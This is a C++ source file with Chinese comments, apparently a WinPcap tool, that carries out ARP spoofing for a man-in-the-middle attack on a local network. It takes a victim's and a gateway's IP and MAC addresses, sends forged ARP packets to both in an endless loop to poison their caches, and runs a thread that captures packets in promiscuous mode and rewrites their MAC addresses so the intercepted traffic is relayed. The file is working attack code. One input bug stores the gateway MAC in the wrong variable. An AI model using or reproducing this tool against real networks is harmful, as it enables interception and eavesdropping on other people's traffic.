//arp_best

#include "stdafx.h"
#define _XKEYCHECK_H
#define HAVE_REMOTE
#include <stdio.h>
#include "pcap.h"
#include "remote-ext.h"
#include <Packet32.h>
#include "arp_struct.h"
#include <iostream>
using namespace std;

#pragma warning(disable:4996)


char  cheatip[20];
char  wgip[20];
char  wgmac[20];
char  cheatmac[20];
char  mymac[20];
unsigned char  wgmacchar[20];
unsigned char  cheatmacchar[20];
unsigned char  mymacchar[20];

typedef struct ether_header {
	u_char ether_dhost[6];      // 目标地址  
	u_char ether_shost[6];      // 源地址  
	u_short ether_type;         // 以太网类型  
}ether_header;


HANDLE thread;
CRITICAL_SECTION print_cs;

char packet_filter[256] = "tcp port http";

// 声明线程函数
DWORD WINAPI CaptureAndForwardThread(LPVOID lpParameter);
// 用于通知转发线程终止的全局变量 
volatile int kill_forwaders = 0;

void tomac(unsigned char * machex, char mac[])
{
	int v, i;
	for (i = 0; i<6; i++) {
		sscanf(mac + 2 * i, "%2x", &v);
		machex[i] = (unsigned char)v;
	}
}

unsigned char charToData(const char ch) {
	if (ch > 47 && ch < 58) {
		return ch - 48;
	}
	if (ch>64 && ch < 71) {
		return ch - 55;
	}
	if (ch>96 && ch < 103) {
		return ch - 87;
	}
	return 0;
}
bool GetMacAddr(const char *chsMac, unsigned char *chdMac) {
	const char *pTemp = chsMac;
	for (int i = 0; i < 6; i++) {
		chdMac[i] = charToData(*pTemp++) * 16;
		chdMac[i] += charToData(*pTemp++);
	}
	return true;
}
void enArpReqPack(Arp_Packet *arp, char *chLocalMac, char *chLocalIp, char *chDstMac, char *chDstIp, bool is_request) {
	//初始化arp结构体
	memset(arp, 0, sizeof(Arp_Packet));
	//填充物理帧中目的MAC
	GetMacAddr(chDstMac, arp->eth.dest_mac);
	//填充物理帧中源MAC
	GetMacAddr(chLocalMac, arp->eth.source_mac);
	//填充物理帧中类型
	arp->eth.eh_type = htons(EH_TYPE);
	//填充硬件类型
	arp->arp.hardware_type = htons(HRD_TYPE);
	//填充上层协议类型
	arp->arp.protocol_type = htons(PRO_TYPE);
	//填充arp包的MAC硬件地址长度
	arp->arp.add_len = MAC_LEN;
	//填充arp包的IP地址长度
	arp->arp.pro_len = IP_LEN;
	//填充arp帧源MAC
	GetMacAddr(chLocalMac, arp->arp.sour_addr);
	//填充arp帧源IP
	arp->arp.sour_ip = inet_addr(chLocalIp);
	//填充arp帧目的IP
	arp->arp.dest_ip = inet_addr(chDstIp);
	//是请求包
	if (is_request) {
		//填充请求包标识，这里忽略arp帧目的MAC（目的MAC全为0，表示待补充）
		arp->arp.option = htons(ARP_REQUEST);
	}
	//是应答包
	else {
		//填充应答包标识
		arp->arp.option = htons(ARP_REPLY);
		//填充arp帧目的MAC
		GetMacAddr(chDstMac, arp->arp.dest_addr);
	}
}

int main() {

	cout << "请输入你要欺骗的IP:" << endl;
	cin >> cheatip;
	//strcpy(cheatip, "192.168.43.154");

	cout << "请输入网关的IP:" << endl;
	cin >> wgip;
	//strcpy(wgip, "192.168.43.1");

	cout << "请输入网关的Mac:" << endl;
	cin >> wgip;
	//strcpy(wgmac, "38bc1a969214");

	cout << "请输入欺骗的Mac:" << endl;
	cin >> cheatmac;
	//strcpy(cheatmac, "08d8334015ff");

	cout << "请输入本机Mac:" << endl;
	cin >> mymac;
	//strcpy(mymac, "8056f2e73135");


	tomac(cheatmacchar, cheatmac);
	tomac(mymacchar, mymac);
	tomac(wgmacchar, wgmac);

	int i = 0, inum;
	Arp_Packet arp_to_gateway = { 0 };//攻击者发给网关,IP为攻击者IP,MAC为受害者MAC,类型为请求
	Arp_Packet arp_to_victim = { 0 };//攻击者发给受害者,IP为攻击者IP,MAC为网关MAC,类型为应答
	pcap_if_t *alldevs, *d;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char szPktBuf[1024], szPktBuff[1024];
	//获取所有的网卡接口
	pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf);
	//显示所有的网卡接口以供选择
	for (d = alldevs; d; d = d->next) {
		printf("%d. %s %x\n", ++i, d->description, unsigned int(d->addresses));
	}
	//选择相应的网卡接口
	printf("Enter the interface number(1-%d):", i);
	scanf("%d", &inum);
	//打开选中的网卡接口
	for (d = alldevs, i = 0; i < inum - 1; i++, d = d->next);

	adhandle = pcap_open(d->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);

	//攻击者发给网关,IP为受害者,MAC为攻击者,类型为请求
	enArpReqPack(&arp_to_gateway,
		mymac,      //源MAC，攻击者MAC
		cheatip,     //源IP，受害者IP
		"ffffffffffff",      //目的MAC，请求的时候要发送广播包，因此是FFFFFFFFFFFF（代表广播）
		wgip        //目的IP，网关IP
		, true);              //设为true，表明是请求包


							  //攻击者发给受害者,IP为网关IP,MAC为攻击者MAC,类型为应答
	enArpReqPack(&arp_to_victim,
		mymac,      //源MAC，攻击者MAC
		wgip,       //源IP，网关IP
		cheatmac,      //目的MAC，受害者MAC
		cheatip      //目的IP，受害者
		, false);             //设为false，表明是应答包


							  //将arp结构体的数据复制到字节数组中，方便发送
	memcpy(szPktBuf, (char*)&arp_to_gateway, sizeof(Arp_Packet));
	memcpy(szPktBuff, (char*)&arp_to_victim, sizeof(Arp_Packet));
	//pcap_sendpacket(adhandle, (const u_char*)szPktBuf, sizeof(Arp_Packet));
	//使用循环不断的发送arp欺骗包，从而淹没正常的arp请求



	if ((thread = CreateThread(NULL, 0, CaptureAndForwardThread, adhandle, 0, NULL)) == NULL)
	{
		fprintf(stderr, "启动截包攻击线程失败.");
		// 关闭网卡
		pcap_close(adhandle);
		// 释放设备列表
		pcap_freealldevs(alldevs);
		return -1;
	}

	while (true) {
		//发送arp数据包给受害者
		if (pcap_sendpacket(adhandle, (const u_char*)szPktBuff, sizeof(Arp_Packet)) != 0) {
			printf("Error sending the packet:%s\n", pcap_geterr(adhandle));
			return -1;
		}
		//发送arp数据包给网关
		if (pcap_sendpacket(adhandle, (const u_char*)szPktBuf, sizeof(Arp_Packet)) != 0) {
			printf("Error sending the packet:%s\n", pcap_geterr(adhandle));
			return -1;
		}
		/*******************************/

		//延时
		Sleep(100);
		printf("发送ARP欺骗报文中。。。\n");
	}
	//扫尾
	pcap_freealldevs(alldevs);
	pcap_close(adhandle);
	return 0;
}


/*******************************************************************
* 转发线程
*******************************************************************/
DWORD WINAPI CaptureAndForwardThread(LPVOID lpParameter)
{
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int res = 0;
	pcap_t * adhandle = (pcap_t *)lpParameter;
	unsigned int n_fwd = 0;
	u_char MAC[20] = "";

	// 获取过滤条件
	/*printf("\n请输入过滤条件（如果没有过滤条件，请按回车键）：");

	fgets(packet_filter, sizeof(packet_filter), stdin);*/



	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0)
	{
		char newdata[65535] = "";
		if (res != 0)	// res=0 代表读超时时间到
		{
			memcpy(newdata, pkt_data, header->caplen);
			if (memcmp(newdata + 6, cheatmacchar, 6) == 0)
			{
				if (memcmp(newdata, mymacchar, 6) == 0)
				{
					memcpy(newdata + 6, mymacchar, 6);
					memcpy(newdata, wgmacchar, 6);
				}
			}
			if (memcmp(newdata + 6, wgmacchar, 6) == 0)
			{
				if (memcmp(newdata, mymacchar, 6) == 0)
				{
					memcpy(newdata + 6, mymacchar, 6);
					memcpy(newdata, cheatmacchar, 6);
				}
			}
			// 发送接收到的数据报文
			if (pcap_sendpacket(adhandle, (const unsigned char *)newdata, header->caplen) != 0)
			{
				EnterCriticalSection(&print_cs);

				printf("Error sending a %u bytes packets on interface : %s\n",
					header->caplen,
					pcap_geterr(adhandle));

				LeaveCriticalSection(&print_cs);
			}
			else
			{
				n_fwd++;
			}
		}

		Sleep(100);
	}

	/**************************** 退出循环，检查退出原因，统计状态************************************/
	if (res < 0)
	{
		EnterCriticalSection(&print_cs);

		printf("Error capturing the packets: %s\n", pcap_geterr(adhandle));
		fflush(stdout);

		LeaveCriticalSection(&print_cs);
	}
	else
	{
		EnterCriticalSection(&print_cs);

		printf("End of bridging on interface . Forwarded packets:%u\n",
			n_fwd);
		fflush(stdout);

		LeaveCriticalSection(&print_cs);
	}

	return 0;
}
